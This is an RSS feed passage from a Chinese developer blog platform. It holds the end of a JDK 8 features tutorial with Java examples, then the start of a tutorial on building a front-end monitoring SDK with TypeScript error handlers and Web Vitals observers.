        List&lt;Integer&gt; parallelResult = numbers.parallelStream()
                .filter(n -&gt; n &gt; <span class="hljs-number">5</span>)
                .map(n -&gt; n * <span class="hljs-number">2</span>)
                .sorted()
                .collect(Collectors.toList());

        System.out.println(<span class="hljs-string">"并行处理结果: "</span> + parallelResult);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateDateTimeAPI</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== 新的日期时间API示例 ==="</span>);

        <span class="hljs-comment">// 旧版Date的问题</span>
        <span class="hljs-type">Date</span> <span class="hljs-variable">oldDate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
        System.out.println(<span class="hljs-string">"旧Date: "</span> + oldDate);

        <span class="hljs-comment">// 新版日期时间API</span>
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">currentDate</span> <span class="hljs-operator">=</span> LocalDate.now();
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> LocalTime.now();
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">currentDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.now();

        System.out.println(<span class="hljs-string">"当前日期: "</span> + currentDate);
        System.out.println(<span class="hljs-string">"当前时间: "</span> + currentTime);
        System.out.println(<span class="hljs-string">"当前日期时间: "</span> + currentDateTime);

        <span class="hljs-comment">// 日期操作</span>
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">tomorrow</span> <span class="hljs-operator">=</span> currentDate.plusDays(<span class="hljs-number">1</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">nextWeek</span> <span class="hljs-operator">=</span> currentDate.plusWeeks(<span class="hljs-number">1</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">nextMonth</span> <span class="hljs-operator">=</span> currentDate.plusMonths(<span class="hljs-number">1</span>);

        System.out.println(<span class="hljs-string">"明天: "</span> + tomorrow);
        System.out.println(<span class="hljs-string">"下周: "</span> + nextWeek);
        System.out.println(<span class="hljs-string">"下月: "</span> + nextMonth);

        <span class="hljs-comment">// 日期比较</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isBefore</span> <span class="hljs-operator">=</span> tomorrow.isBefore(nextWeek);
        System.out.println(<span class="hljs-string">"明天是否在下周之前: "</span> + isBefore);

        <span class="hljs-comment">// 日期格式化</span>
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> currentDateTime.format(formatter);
        System.out.println(<span class="hljs-string">"格式化日期: "</span> + formatted);

        <span class="hljs-comment">// 时区处理</span>
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zonedDateTime</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">"America/New_York"</span>));
        System.out.println(<span class="hljs-string">"纽约时间: "</span> + zonedDateTime);

        <span class="hljs-comment">// 持续时间计算</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2024</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> LocalDateTime.now();
        <span class="hljs-type">Duration</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> Duration.between(start, end);
        System.out.println(<span class="hljs-string">"从2024年开始已经过去了: "</span> + duration.toDays() + <span class="hljs-string">" 天"</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateDefaultMethods</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"\n=== 接口默认方法示例 ==="</span>);

        <span class="hljs-type">Calculator</span> <span class="hljs-variable">calculator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BasicCalculator</span>();
        System.out.println(<span class="hljs-string">"加法: "</span> + calculator.add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
        System.out.println(<span class="hljs-string">"减法: "</span> + calculator.subtract(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
        System.out.println(<span class="hljs-string">"乘法: "</span> + calculator.multiply(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
        System.out.println(<span class="hljs-string">"默认方法平方: "</span> + calculator.square(<span class="hljs-number">5</span>));
    }
}

<span class="hljs-comment">// 接口默认方法示例</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>;
    <span class="hljs-type">int</span> <span class="hljs-title function_">subtract</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span>;

    <span class="hljs-comment">// 默认方法 - 接口可以提供实现</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">int</span> <span class="hljs-title function_">multiply</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a * b;
    }

    <span class="hljs-comment">// 另一个默认方法</span>
    <span class="hljs-keyword">default</span> <span class="hljs-type">int</span> <span class="hljs-title function_">square</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> {
        <span class="hljs-keyword">return</span> multiply(a, a);
    }

    <span class="hljs-comment">// 静态方法 - 接口中的工具方法</span>
    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getVersion</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Calculator v1.0"</span>;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicCalculator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Calculator</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a + b;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">subtract</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {
        <span class="hljs-keyword">return</span> a - b;
    }

    <span class="hljs-comment">// 不需要实现默认方法，可以直接使用</span>
    <span class="hljs-comment">// 也可以选择重写默认方法</span>
}
</code></pre>
<h3 data-id="heading-18">6. 总结</h3>
<p>JDK 8是Java发展史上的一个重要里程碑，引入的Lambda表达式、Stream API、新日期时间API等特性，不仅使代码更简洁、更易读，还显著提升了性能。这些特性为Java带来了函数式编程的能力，使Java在现代应用开发中保持竞争力。</p>
<p>通过合理使用JDK 8的新特性，开发者可以：</p>
<ul>
<li>编写更简洁、更表达力强的代码</li>
<li>充分利用多核处理器提升性能</li>
<li>避免常见的错误（如空指针异常、线程安全问题）</li>
<li>提高开发效率和代码可维护性</li>
</ul>
<p>JDK 8的特性为后续版本的发展奠定了基础，是每个Java开发者都应该掌握的核心知识。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端监控实践]]></title>    <link>https://juejin.cn/post/7605856048361537574</link>    <guid>https://juejin.cn/post/7605856048361537574</guid>    <pubDate>2026-02-13T05:51:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605856048361537574" data-draft-id="7605881632541016115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端监控实践"/> <meta itemprop="keywords" content="前端,性能优化"/> <meta itemprop="datePublished" content="2026-02-13T05:51:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李元_霸"/> <meta itemprop="url" content="https://juejin.cn/user/2524917887410397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端监控实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524917887410397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李元_霸
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:51:40.000Z" title="Fri Feb 13 2026 05:51:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从零开发前端监控 SDK：异常、性能、访问量一网打尽</h2>
<blockquote>
<p>本文将带你从零开发一个完整的前端监控 SDK，涵盖异常监控、性能监控和访问量统计三大核心功能。</p>
</blockquote>
<h3 data-id="heading-1">目录</h3>
<ol>
<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%89%8D%E7%AB%AF%E7%9B%91%E6%8E%A7" title="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%89%8D%E7%AB%AF%E7%9B%91%E6%8E%A7">为什么需要前端监控</a></li>
<li><a href="#sdk-%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1" title="#sdk-%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1">SDK 架构设计</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0" title="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0">核心功能实现</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B" title="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B">使用示例</a></li>
<li><a href="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B" title="#%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B">总结与展望</a></li>
</ol>
<hr/>
<h3 data-id="heading-2">为什么需要前端监控</h3>
<p>在现代 Web 应用中，前端监控已经成为保障用户体验的重要手段：</p>
<ul>
<li><strong>异常监控</strong>：及时发现并修复线上 Bug，减少用户流失</li>
<li><strong>性能监控</strong>：优化页面加载速度，提升用户体验</li>
<li><strong>访问统计</strong>：了解用户行为，指导产品决策</li>
</ul>
<p>市面上已有 Sentry、Fundebug 等成熟的监控服务，但开发自己的 SDK 能让我们：</p>
<ol>
<li>完全掌控数据，保障隐私安全</li>
<li>根据业务需求定制功能</li>
<li>深入理解监控原理，提升技术能力</li>
</ol>
<hr/>
<h3 data-id="heading-3">SDK 架构设计</h3>
<h4 data-id="heading-4">整体架构</h4>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│                        Monitor SDK                          │
├─────────────────────────────────────────────────────────────┤
│  Core Layer  │  Reporter (上报中心)  │  Config (配置管理)    │
├─────────────────────────────────────────────────────────────┤
│  Module Layer│  ErrorMonitor │ PerformanceMonitor │ VisitMonitor│
├─────────────────────────────────────────────────────────────┤
│  Utils Layer │  Device │ Storage │ UUID │ Sampling           │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-5">设计原则</h4>
<ol>
<li><strong>模块化</strong>：每个监控功能独立模块，可单独启用/禁用</li>
<li><strong>插件化</strong>：Reporter 统一管理上报，支持批量和即时发送</li>
<li><strong>低侵入</strong>：自动捕获异常，业务代码零改动</li>
<li><strong>高兼容</strong>：支持多种引入方式（ESM/CJS/UMD）</li>
</ol>
<hr/>
<h3 data-id="heading-6">核心功能实现</h3>
<h4 data-id="heading-7">1. 异常监控模块</h4>
<p>异常监控是 SDK 的核心功能，我们需要捕获多种类型的错误：</p>
<h5 data-id="heading-8">1.1 JavaScript 运行时错误</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/error/globalError.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initGlobalError</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params">event: ErrorEvent</span>) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">errorData</span>: <span class="hljs-title class_">ErrorData</span> = {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'js'</span>,
      <span class="hljs-attr">message</span>: event.<span class="hljs-property">message</span>,
      <span class="hljs-attr">filename</span>: event.<span class="hljs-property">filename</span>,
      <span class="hljs-attr">lineno</span>: event.<span class="hljs-property">lineno</span>,
      <span class="hljs-attr">colno</span>: event.<span class="hljs-property">colno</span>,
      <span class="hljs-attr">stack</span>: event.<span class="hljs-property">error</span>?.<span class="hljs-property">stack</span>
    };
    reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'error'</span>, errorData);
  };

  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, handler);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'error'</span>, handler);
}
</code></pre>
<p>通过监听 <code>window.onerror</code>，我们可以捕获所有同步和异步的 JavaScript 错误。</p>
<h5 data-id="heading-9">1.2 Promise 未捕获异常</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/error/promiseError.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initPromiseError</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params">event: PromiseRejectionEvent</span>) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">errorData</span>: <span class="hljs-title class_">ErrorData</span> = {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'promise'</span>,
      <span class="hljs-attr">message</span>: event.<span class="hljs-property">reason</span>?.<span class="hljs-property">message</span> || <span class="hljs-title class_">String</span>(event.<span class="hljs-property">reason</span>),
      <span class="hljs-attr">stack</span>: event.<span class="hljs-property">reason</span>?.<span class="hljs-property">stack</span>
    };
    reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'error'</span>, errorData);
  };

  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, handler);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, handler);
}
</code></pre>
<p>现代前端大量使用 Promise，未捕获的 Promise 错误会导致应用崩溃。</p>
<h5 data-id="heading-10">1.3 资源加载错误</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/error/resourceError.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initResourceError</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params">event: Event</span>) =&gt; {
    <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>;
    <span class="hljs-keyword">const</span> tagName = target.<span class="hljs-property">tagName</span>?.<span class="hljs-title function_">toLowerCase</span>();

    <span class="hljs-keyword">if</span> (![<span class="hljs-string">'img'</span>, <span class="hljs-string">'script'</span>, <span class="hljs-string">'link'</span>].<span class="hljs-title function_">includes</span>(tagName)) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> src = (target <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">src</span> || (target <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">href</span> || <span class="hljs-string">''</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-attr">errorData</span>: <span class="hljs-title class_">ErrorData</span> = {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'resource'</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">`Failed to load <span class="hljs-subst">${tagName}</span>: <span class="hljs-subst">${src}</span>`</span>,
      <span class="hljs-attr">filename</span>: src,
      <span class="hljs-attr">extra</span>: { tagName }
    };
    reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'error'</span>, errorData);
  };

  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, handler, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 捕获阶段监听</span>
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'error'</span>, handler, <span class="hljs-literal">true</span>);
}
</code></pre>
<p>使用捕获阶段（<code>true</code>）可以监听到资源加载错误。</p>
<h5 data-id="heading-11">1.4 网络请求错误</h5>
<p>通过劫持 XMLHttpRequest 和 fetch API，监控所有网络请求：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/error/networkError.ts</span>
<span class="hljs-keyword">const</span> originalFetch = <span class="hljs-variable language_">window</span>.<span class="hljs-property">fetch</span>;
<span class="hljs-variable language_">window</span>.<span class="hljs-property">fetch</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">input: RequestInfo | URL, init?: RequestInit</span>) {
  <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">typeof</span> input === <span class="hljs-string">'string'</span> ? input : input.<span class="hljs-title function_">toString</span>();

  <span class="hljs-keyword">return</span> originalFetch.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
        reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'error'</span>, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'network'</span>,
          <span class="hljs-attr">message</span>: <span class="hljs-string">`Fetch <span class="hljs-subst">${response.status}</span>: <span class="hljs-subst">${response.statusText}</span>`</span>,
          <span class="hljs-attr">extra</span>: { <span class="hljs-attr">method</span>: init?.<span class="hljs-property">method</span> || <span class="hljs-string">'GET'</span>, url, <span class="hljs-attr">status</span>: response.<span class="hljs-property">status</span> }
        });
      }
      <span class="hljs-keyword">return</span> response;
    })
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
      reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'error'</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'network'</span>,
        <span class="hljs-attr">message</span>: <span class="hljs-string">`Fetch failed: <span class="hljs-subst">${error.message}</span>`</span>,
        <span class="hljs-attr">extra</span>: { <span class="hljs-attr">method</span>: init?.<span class="hljs-property">method</span> || <span class="hljs-string">'GET'</span>, url }
      });
      <span class="hljs-keyword">throw</span> error;
    });
};
</code></pre>
<h4 data-id="heading-12">2. 性能监控模块</h4>
<h5 data-id="heading-13">2.1 Web Vitals 指标</h5>
<p>Core Web Vitals 是 Google 提出的衡量用户体验的关键指标：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/performance/webVitals.ts</span>

<span class="hljs-comment">// LCP - 最大内容绘制</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">observeLCP</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> entries = list.<span class="hljs-title function_">getEntries</span>();
    <span class="hljs-keyword">const</span> lastEntry = entries[entries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
    <span class="hljs-keyword">const</span> value = (lastEntry <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">renderTime</span> || lastEntry.<span class="hljs-property">startTime</span>;

    reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'performance'</span>, {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'web-vitals'</span>,
      <span class="hljs-attr">name</span>: <span class="hljs-string">'LCP'</span>,
      <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(value),
      <span class="hljs-attr">rating</span>: value &lt;= <span class="hljs-number">2500</span> ? <span class="hljs-string">'good'</span> : value &lt;= <span class="hljs-number">4000</span> ? <span class="hljs-string">'needs-improvement'</span> : <span class="hljs-string">'poor'</span>
    });
  });

  observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'largest-contentful-paint'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span> });
}

<span class="hljs-comment">// CLS - 累积布局偏移</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">observeCLS</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">let</span> clsValue = <span class="hljs-number">0</span>;

  <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">list</span>) =&gt;</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> entry <span class="hljs-keyword">of</span> list.<span class="hljs-title function_">getEntries</span>()) {
      <span class="hljs-keyword">const</span> layoutEntry = entry <span class="hljs-keyword">as</span> <span class="hljs-title class_">PerformanceEntry</span> &amp; { <span class="hljs-attr">hadRecentInput</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span> };
      <span class="hljs-keyword">if</span> (!layoutEntry.<span class="hljs-property">hadRecentInput</span>) {
        clsValue += layoutEntry.<span class="hljs-property">value</span>;
      }
    }
  });

  observer.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'layout-shift'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span> });

  <span class="hljs-comment">// 页面隐藏时上报</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'visibilitychange'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">'hidden'</span>) {
      reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'performance'</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'web-vitals'</span>,
